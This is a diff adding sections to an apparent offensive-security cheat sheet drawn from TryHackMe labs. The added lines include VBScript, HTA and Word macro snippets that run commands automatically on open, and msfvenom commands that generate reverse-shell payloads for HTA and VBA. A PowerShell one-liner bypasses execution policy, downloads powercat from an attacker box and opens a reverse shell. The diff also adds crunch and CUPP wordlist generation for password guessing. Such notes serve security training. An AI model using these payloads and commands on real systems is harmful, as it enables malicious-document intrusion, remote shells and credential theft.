@@ -501,6 +501,12 @@ content query --uri content://com.android.asdasd.TrackUserContentProvider/tracku
 
 crunch 8 9 xy123 -o testwordlists
 
+crunch 6 6 -t pass%%
+
+crunch 2 2 01234abcd -o crunch.txt
+
+crunch 5 5 -t "THM^^" -o tryhackme.txt
+
 # BetterCap #
 
 bettercap -iface wlan0
@@ -604,6 +610,98 @@ RewriteEngine On
 RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
 
 ProxyPass "/" "http://localhost:8080/"
+
+# WScript / CScript.exe / VBS #
+
+Dim message 
+message = "Welcome to THM"
+MsgBox message
+
+Set shell = WScript.CreateObject("Wscript.Shell")
+shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
+
+wscript c:\Users\thm\Desktop\payload.vbs
+
+cscript.exe c:\Users\thm\Desktop\payload.vbs
+
+wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
+
+# HTML / HTA #
+
+<html>
+<body>
+<script>
+	var c= 'cmd.exe'
+	new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</body>
+</html>
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
+
+use exploit/windows/misc/hta_server
+
+## Word Macro ##
+
+Sub Document_Open()
+  THM
+End Sub
+
+Sub AutoOpen()
+  THM
+End Sub
+
+Sub THM()
+   MsgBox ("Welcome to Weaponization Room!")
+End Sub
+
+Sub PoC()
+	Dim payload As String
+	payload = "calc.exe"
+	CreateObject("Wscript.Shell").Run payload,0
+End Sub
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
+
+## PowerShell Execution ##
+
+powershell -File thm.ps1
+
+Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
+
+powershell -ex bypass -File thm.ps1
+
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
+
+# Default Passwords #
+
+https://cirt.net/passwords
+
+https://default-password.info/
+
+https://datarecovery.com/rd/default-passwords/
+
+cat file1.txt file2.txt file3.txt > combined_list.txt
+
+sort combined_list.txt | uniq -u > cleaned_combined_list.txt
+
+python3 username_generator.py -h
+
+echo "John Smith" > users.lst
+
+python3 username_generator.py -w users.lst
+
+# Cupp #
+
+git clone https://github.com/Mebus/cupp.git
+
+python3 cupp.py
+
+python3 cupp.py -i
+
+python3 cupp.py -l
+
+python3 cupp.py -a
 
 
 
